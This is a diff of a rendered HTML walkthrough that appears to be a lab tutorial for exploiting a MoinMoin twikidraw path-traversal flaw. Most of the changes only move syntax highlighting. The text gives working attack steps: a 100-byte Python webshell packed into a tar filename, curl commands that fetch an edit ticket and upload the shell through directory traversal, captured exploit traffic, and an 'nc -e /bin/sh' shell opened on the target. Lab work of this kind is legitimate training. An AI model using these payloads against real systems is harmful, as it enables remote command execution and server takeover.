@@ -254,20 +254,20 @@
 <span class="c1"># 100</span>
 <span class="nb">echo</span> <span class="s2">&quot;hello&quot;</span> &gt; <span class="nv">$NAME100</span>
 tar --create --file tar100.tar <span class="nv">$NAME100</span>
-cat tar100.tar
-<span class="c1"># OUTPUT:</span>
-<span class="c1"># 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414615023236 0ustar  hacker12hacker12hello</span>
-
-<span class="c1"># &gt;= 101 byte filenames do not start the tar archive</span>
-<span class="nv">NAME101</span><span class="o">=</span><span class="si">${</span><span class="nv">NAME100</span><span class="si">}</span><span class="m">0</span>
+<span class="hll">cat tar100.tar
+</span><span class="hll"><span class="c1"># OUTPUT:</span>
+</span><span class="hll"><span class="c1"># 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414615023236 0ustar  hacker12hacker12hello</span>
+</span>
+<span class="hll"><span class="c1"># &gt;= 101 byte filenames do not start the tar archive</span>
+</span><span class="nv">NAME101</span><span class="o">=</span><span class="si">${</span><span class="nv">NAME100</span><span class="si">}</span><span class="m">0</span>
 <span class="nb">echo</span> <span class="si">${#</span><span class="nv">NAME101</span><span class="si">}</span>
 <span class="c1"># OUTPUT:</span>
 <span class="c1"># 101</span>
 <span class="nb">echo</span> <span class="s2">&quot;hello&quot;</span> &gt; <span class="nv">$NAME101</span>
-tar --create --file tar101.tar <span class="nv">$NAME101</span>
-cat tar101.tar
-<span class="c1"># ././@LongLink0000644000000000000000000000014600000000000011604 Lustar  rootroot0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789001234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414743023240 0ustar  hacker12hacker12hello</span>
-</pre></div>
+<span class="hll">tar --create --file tar101.tar <span class="nv">$NAME101</span>
+</span><span class="hll">cat tar101.tar
+</span><span class="hll"><span class="c1"># ././@LongLink0000644000000000000000000000014600000000000011604 Lustar  rootroot0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789001234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414743023240 0ustar  hacker12hacker12hello</span>
+</span></pre></div>
 </div>
 </div>
 <div class="section" id="fitting-an-exploit-in-100-bytes">
@@ -279,10 +279,10 @@ cat tar101.tar
 <li>As long as the “filename” (python code) is &lt;= 100 bytes, it will be the first bytes in the tar archive: you have uploaded executable python code.</li>
 </ul>
 <p>Here is a simple python script to execute a shell command:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">import os
-</span>def execute<span class="o">(</span>pagename, request<span class="o">)</span>:
-  <span class="nv">stream</span> <span class="o">=</span> os.popen<span class="o">(</span>request.values<span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span>
-  request.write<span class="o">(</span>stream.read<span class="o">())</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>import os
+def execute<span class="o">(</span>pagename, request<span class="o">)</span>:
+<span class="hll">  <span class="nv">stream</span> <span class="o">=</span> os.popen<span class="o">(</span>request.values<span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span>
+</span>  request.write<span class="o">(</span>stream.read<span class="o">())</span>
 </pre></div>
 </div>
 <p>But this code must have the filename “drawing[.ext]” where “drawing” is fixed and the extension we can control. Here goes the next attempt:</p>
@@ -292,20 +292,22 @@ cat tar101.tar
 <span class="s">def execute(pagename, request):</span>
 <span class="s">  stream = os.popen(request.values[&#39;cmd&#39;])</span>
 <span class="s">  request.write(stream.read())</span>
-<span class="s">EOF</span>
-wc -c cmd.py
-<span class="c1"># OUTPUT:</span>
-<span class="c1"># 137</span>
-</pre></div>
+<span class="hll"><span class="s">EOF</span>
+</span><span class="hll">wc -c cmd.py
+</span><span class="hll"><span class="c1"># OUTPUT:</span>
+</span><span class="hll"><span class="c1"># 137</span>
+</span></pre></div>
 </div>
 <p>That’s too long, so reaching in the python bag of tricks, this does the job:</p>
 <div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">cat &gt; payload.py <span class="s">&lt;&lt;&#39;EOF&#39;</span>
 </span><span class="s">drawing.r if()else()</span>
 <span class="s">import os</span>
 <span class="s">def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;</span>
-<span class="s">EOF</span>
-wc -c payload.py
-</pre></div>
+<span class="hll"><span class="s">EOF</span>
+</span><span class="hll">wc -c payload.py
+</span><span class="hll"><span class="c1"># OUTPUT:</span>
+</span><span class="hll"><span class="c1"># 100</span>
+</span></pre></div>
 </div>
 <p>It’s actually possible to shrink the size down even further by passing the shell command in the HTTP Host header (<code class="docutils literal notranslate"><span class="pre">Host:</span> <span class="pre">uname</span> <span class="pre">-a</span></code>), but we won’t do that.</p>
 </div>
@@ -343,11 +345,11 @@ cat &gt; exploit.rb <span class="s">&lt;&lt;&#39;EOF&#39;</span>
 
 <span class="s"># getting  valid ticket</span>
 <span class="s">resp = ssend(&quot;GET /moin/WikiSandBox?action=twikidraw&amp;do=modify&amp;target=../../../../data/plugin/action/moinexec.py HTTP/1.0\r\nHost: vulnerable\r\n\r\n&quot;)</span>
-<span class="s"># CORRECTION HERE &quot;&amp;&quot; ==&gt; &quot;&amp;amp;&quot;</span>
-<span class="hll"><span class="s"># OLD - if resp =~ /ticket=(.*?)&amp;target=/</span>
+<span class="hll"><span class="s"># CORRECTION HERE &quot;&amp;&quot; ==&gt; &quot;&amp;amp;&quot;</span>
+</span><span class="hll"><span class="s"># OLD - if resp =~ /ticket=(.*?)&amp;target=/</span>
 </span><span class="hll"><span class="s">if resp =~ /ticket=(.*?)&amp;amp;target=/</span>
-</span><span class="hll"><span class="s">  ticket = $1</span>
-</span><span class="s">end</span>
+</span><span class="s">  ticket = $1</span>
+<span class="s">end</span>
 
 <span class="s">head = &quot;POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=#{ticket}&amp;target=../../../../data/plugin/action/moinexec.py HTTP/1.1\r\nHost: vulnerable\r\nContent-Type: multipart/form-data; boundary=pentesterlab\r\nContent-Length: &quot;</span>
 
@@ -370,31 +372,31 @@ cat &gt; exploit.rb <span class="s">&lt;&lt;&#39;EOF&#39;</span>
 </pre></div>
 </div>
 <p>In one terminal window start <code class="docutils literal notranslate"><span class="pre">ngrep</span></code>:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">LINK</span><span class="o">=</span>virbr0
-</span>sudo ngrep -l -p -d <span class="nv">$LINK</span> <span class="se">\</span>
-  <span class="s2">&quot;^GET |^POST &quot;</span> tcp and port <span class="m">80</span> and host vulnerable
-</pre></div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LINK</span><span class="o">=</span>virbr0
+<span class="hll">sudo ngrep -l -p -d <span class="nv">$LINK</span> <span class="se">\</span>
+</span><span class="hll">  <span class="s2">&quot;^GET |^POST &quot;</span> tcp and port <span class="m">80</span> and host vulnerable
+</span></pre></div>
 </div>
 <p>In another terminal run the ruby exploit:</p>
 <div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">ruby exploit.rb
 </span></pre></div>
 </div>
 <p>The captured data is:</p>
-<div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span class="hll">#####################################
-</span>T 192.168.122.1:52262 -&gt; 192.168.122.99:80 [AP] #144
-  GET /moin/WikiSandBox?action=twikidraw&amp;do=modify&amp;target=../../../../data/pl
-  ugin/action/moinexec.py HTTP/1.0..Host: vulnerable....
-#################################
-T 192.168.122.1:52264 -&gt; 192.168.122.99:80 [AP] #177
-  POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=&amp;target=../../../../
-  data/plugin/action/moinexec.py HTTP/1.1..Host: vulnerable..Content-Type: mu
-  ltipart/form-data; boundary=pentesterlab..Content-Length: 333....--penteste
-  rlab..Content-Disposition: form-data; name=&quot;filename&quot;..Content-Type: image/
-  png....drawing.s if()else().import os.def execute(p,r):exec&quot;print&gt;&gt;r,os\56p
-  open(r\56values[&#39;c&#39;])\56read()&quot;..--pentesterlab..Content-Disposition: form-
-  data; name=&quot;filepath&quot;; filename=&quot;drawing.png&quot;..Content-Type: image/png....B
-  LAH..--pentesterlab--..
-</pre></div>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>#####################################
+<span class="hll">T 192.168.122.1:52262 -&gt; 192.168.122.99:80 [AP] #144
+</span><span class="hll">  GET /moin/WikiSandBox?action=twikidraw&amp;do=modify&amp;target=../../../../data/pl
+</span><span class="hll">  ugin/action/moinexec.py HTTP/1.0..Host: vulnerable....
+</span>#################################
+<span class="hll">T 192.168.122.1:52264 -&gt; 192.168.122.99:80 [AP] #177
+</span><span class="hll">  POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=&amp;target=../../../../
+</span><span class="hll">  data/plugin/action/moinexec.py HTTP/1.1..Host: vulnerable..Content-Type: mu
+</span><span class="hll">  ltipart/form-data; boundary=pentesterlab..Content-Length: 333....--penteste
+</span><span class="hll">  rlab..Content-Disposition: form-data; name=&quot;filename&quot;..Content-Type: image/
+</span><span class="hll">  png....drawing.s if()else().import os.def execute(p,r):exec&quot;print&gt;&gt;r,os\56p
+</span><span class="hll">  open(r\56values[&#39;c&#39;])\56read()&quot;..--pentesterlab..Content-Disposition: form-
+</span><span class="hll">  data; name=&quot;filepath&quot;; filename=&quot;drawing.png&quot;..Content-Type: image/png....B
+</span><span class="hll">  LAH..--pentesterlab--..
+</span></pre></div>
 </div>
 <p>Cleaned up the POST looks like:</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span class="hll">POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=&amp;target=../../../../data/plugin/action/moinexec.py HTTP/1.1
@@ -403,31 +405,31 @@ Content-Type: multipart/form-data; boundary=pentesterlab
 Content-Length: 333
 
 --pentesterlab
-Content-Disposition: form-data; name=&quot;filename&quot;
-Content-Type: image/png
+<span class="hll">Content-Disposition: form-data; name=&quot;filename&quot;
+</span>Content-Type: image/png
 
-drawing.s if()else()
-import os.def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;
---pentesterlab
-Content-Disposition: form-data; name=&quot;filepath&quot;;filename=&quot;drawing.png&quot;
-Content-Type: image/png
+<span class="hll">drawing.s if()else()
+</span><span class="hll">import os.def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;
+</span>--pentesterlab
+<span class="hll">Content-Disposition: form-data; name=&quot;filepath&quot;;filename=&quot;drawing.png&quot;
+</span>Content-Type: image/png
 
-BLAH
---pentesterlab--
+<span class="hll">BLAH
+</span>--pentesterlab--
 </pre></div>
 </div>
 <p>When done, stop the <code class="docutils literal notranslate"><span class="pre">ngrep</span></code> capture. The first HTTP request is equivalent to this <code class="docutils literal notranslate"><span class="pre">curl</span></code>:</p>
 <div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl --silent --get http://<span class="nv">$TARGET</span>/moin/WikiSandBox <span class="se">\</span>
-</span>  --data-urlencode <span class="nv">action</span><span class="o">=</span>twikidraw <span class="se">\</span>
-  --data-urlencode <span class="k">do</span><span class="o">=</span>modify <span class="se">\</span>
-  --data-urlencode <span class="nv">target</span><span class="o">=</span>../../../../data/plugin/action/moinexec.py
-</pre></div>
+</span><span class="hll">  --data-urlencode <span class="nv">action</span><span class="o">=</span>twikidraw <span class="se">\</span>
+</span><span class="hll">  --data-urlencode <span class="k">do</span><span class="o">=</span>modify <span class="se">\</span>
+</span><span class="hll">  --data-urlencode <span class="nv">target</span><span class="o">=</span>../../../../data/plugin/action/moinexec.py
+</span></pre></div>
 </div>
 <p>From the ruby code, the whole purpose of this is to get a ticket to be used in the second request. Here goes the gist of the second request (note that TICKET and PAYLOAD strings haven’t been defined yet):</p>
 <div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl -v --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=</span><span class="nv">$TICKET</span><span class="s2">&amp;target=../../../../data/plugin/action/moinexec.py&quot;</span> <span class="se">\</span>
-</span>  --form <span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span> <span class="se">\</span>
-  --form <span class="nv">filepath</span><span class="o">=</span><span class="s2">&quot;@drawing.png;type=image/png&quot;</span>
-</pre></div>
+</span><span class="hll">  --form <span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">  --form <span class="nv">filepath</span><span class="o">=</span><span class="s2">&quot;@drawing.png;type=image/png&quot;</span>
+</span></pre></div>
 </div>
 <p>Note this is a mix of HTTP GET and a POST with <code class="docutils literal notranslate"><span class="pre">multipart/form-data</span></code>: you cannot use <code class="docutils literal notranslate"><span class="pre">--data-urlencode</span></code> as <code class="docutils literal notranslate"><span class="pre">curl</span></code> does not allow mixiing <code class="docutils literal notranslate"><span class="pre">--data-urlencode</span></code> and <code class="docutils literal notranslate"><span class="pre">--form</span></code>.</p>
 <p>Note that it’s likely MoinMoin is located at <code class="file docutils literal notranslate"><span class="pre">/var/www/moin</span></code> and the plugin directory is at <code class="file docutils literal notranslate"><span class="pre">/var/lib/moin/data/plugin/action/</span></code></p>
@@ -437,46 +439,46 @@ BLAH
 <div class="section" id="upload-the-python-exploit">
 <h3>3.2.4.1. Upload the python exploit<a class="headerlink" href="#upload-the-python-exploit" title="Permalink to this headline">¶</a></h3>
 <p>This uploads the python exploit. Make sure that the target file does not already exist (delete it or choose an unused filename if it does).</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># NOTE: vulnerable must be in /etc/hosts</span>
-</span><span class="nv">TARGET</span><span class="o">=</span>vulnerable
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># NOTE: vulnerable must be in /etc/hosts</span>
+<span class="nv">TARGET</span><span class="o">=</span>vulnerable
 
-<span class="nv">TICKET</span><span class="o">=</span><span class="k">$(</span>curl -v --silent --get http://<span class="nv">$TARGET</span>/moin/WikiSandBox <span class="se">\</span>
-  --data-urlencode <span class="nv">action</span><span class="o">=</span>twikidraw <span class="se">\</span>
-  --data-urlencode <span class="k">do</span><span class="o">=</span>modify <span class="se">\</span>
-  --data-urlencode <span class="nv">target</span><span class="o">=</span>../../../../data/plugin/action/moinexec.py <span class="se">\</span>
-  <span class="p">|</span> grep <span class="s1">&#39;ticket=&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*ticket=//;s/\&amp;.*//&#39;</span><span class="k">)</span>
-<span class="nb">echo</span> <span class="nv">ticket</span><span class="o">=</span><span class="nv">$TICKET</span>
+<span class="hll"><span class="nv">TICKET</span><span class="o">=</span><span class="k">$(</span>curl -v --silent --get http://<span class="nv">$TARGET</span>/moin/WikiSandBox <span class="se">\</span>
+</span><span class="hll">  --data-urlencode <span class="nv">action</span><span class="o">=</span>twikidraw <span class="se">\</span>
+</span><span class="hll">  --data-urlencode <span class="k">do</span><span class="o">=</span>modify <span class="se">\</span>
+</span><span class="hll">  --data-urlencode <span class="nv">target</span><span class="o">=</span>../../../../data/plugin/action/moinexec.py <span class="se">\</span>
+</span><span class="hll">  <span class="p">|</span> grep <span class="s1">&#39;ticket=&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*ticket=//;s/\&amp;.*//&#39;</span><span class="k">)</span>
+</span><span class="nb">echo</span> <span class="nv">ticket</span><span class="o">=</span><span class="nv">$TICKET</span>
 
-cat &gt; payload.py <span class="s">&lt;&lt;&#39;EOF&#39;</span>
-<span class="s">drawing.r if()else()</span>
-<span class="s">import os</span>
-<span class="s">def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;</span>
-<span class="s">EOF</span>
-<span class="nv">PAYLOAD</span><span class="o">=</span><span class="k">$(</span>cat payload.py<span class="k">)</span>
+<span class="hll">cat &gt; payload.py <span class="s">&lt;&lt;&#39;EOF&#39;</span>
+</span><span class="hll"><span class="s">drawing.r if()else()</span>
+</span><span class="hll"><span class="s">import os</span>
+</span><span class="hll"><span class="s">def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;</span>
+</span><span class="hll"><span class="s">EOF</span>
+</span><span class="nv">PAYLOAD</span><span class="o">=</span><span class="k">$(</span>cat payload.py<span class="k">)</span>
 
 <span class="nb">echo</span> <span class="s2">&quot;BLAH&quot;</span> &gt; drawing.png
 
-curl -v --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=</span><span class="nv">$TICKET</span><span class="s2">&amp;target=../../../../data/plugin/action/moinexec.py&quot;</span> <span class="se">\</span>
-  --form <span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span> <span class="se">\</span>
-  --form <span class="nv">filepath</span><span class="o">=</span><span class="s2">&quot;@drawing.png;type=image/png&quot;</span> <span class="se">\</span>
-  --trace-ascii -
-</pre></div>
+<span class="hll">curl -v --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=</span><span class="nv">$TICKET</span><span class="s2">&amp;target=../../../../data/plugin/action/moinexec.py&quot;</span> <span class="se">\</span>
+</span><span class="hll">  --form <span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">  --form <span class="nv">filepath</span><span class="o">=</span><span class="s2">&quot;@drawing.png;type=image/png&quot;</span> <span class="se">\</span>
+</span><span class="hll">  --trace-ascii -
+</span></pre></div>
 </div>
 </div>
 <div class="section" id="the-reverse-shell">
 <h3>3.2.4.2. The reverse shell<a class="headerlink" href="#the-reverse-shell" title="Permalink to this headline">¶</a></h3>
 <p>In one terminal window start up a shell using <code class="docutils literal notranslate"><span class="pre">nc</span></code>:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">TARGET</span><span class="o">=</span>vulnerable
-</span>curl --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox&quot;</span> <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span>vulnerable
+curl --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox&quot;</span> <span class="se">\</span>
   --data-urlencode <span class="nv">action</span><span class="o">=</span>moinexec <span class="se">\</span>
-  --data-urlencode <span class="s2">&quot;c=nc -l -p 9999 -e /bin/sh&quot;</span>
-</pre></div>
+<span class="hll">  --data-urlencode <span class="s2">&quot;c=nc -l -p 9999 -e /bin/sh&quot;</span>
+</span></pre></div>
 </div>
 <p>In another terminal window connect to the reverse shell:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">TARGET</span><span class="o">=</span>vulnerable
-</span><span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
-nc <span class="nv">$TARGET</span> <span class="nv">$PORT</span>
-<span class="c1"># In the resulting shell</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span>vulnerable
+<span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
+<span class="hll">nc <span class="nv">$TARGET</span> <span class="nv">$PORT</span>
+</span><span class="c1"># In the resulting shell</span>
 python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 id
 hostname
